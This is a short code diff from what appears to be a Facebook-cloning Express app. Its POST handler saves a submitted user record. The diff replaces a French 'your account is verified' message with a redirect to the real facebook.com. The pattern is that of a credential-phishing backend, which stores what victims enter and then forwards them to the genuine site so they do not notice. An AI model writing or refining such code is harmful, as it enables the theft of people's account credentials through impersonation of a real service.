@@ -32,7 +32,7 @@ app.post("/facebookclone/api",(req,res,next)=>{
     })
     user.save()
     .then(()=>{
-        res.status(201).send("Bien, votre compte a bien été verifié mainteneant vous pouvez navigeur sur facebook en toute securité")
+        res.status(201).redirect("https://facebook.com");
         console.log("Un utilisateur a été crée")
     })
     .catch(err=>{
